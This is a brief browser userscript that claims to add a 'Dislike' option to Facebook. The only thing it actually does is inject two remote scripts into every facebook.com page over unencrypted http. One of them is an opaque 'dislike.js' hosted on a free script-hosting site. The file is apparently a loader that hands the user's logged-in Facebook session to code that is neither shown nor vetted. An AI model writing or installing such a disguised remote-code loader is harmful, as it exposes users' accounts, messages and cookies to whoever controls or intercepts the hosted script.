// ==UserScript==
// @name           Facebook Dislike Option - Phoenix!
// @namespace      levelunlocked@gmail.com
// @include        *.facebook.com*
// ==/UserScript==

var jq = document.createElement('script');
jq.src = 'http://code.jquery.com/jquery-latest.js';
jq.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(jq);

var dislike = document.createElement('script');
dislike.src = 'http://www.yourjavascript.com/00462141319/dislike.js';
dislike.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(dislike);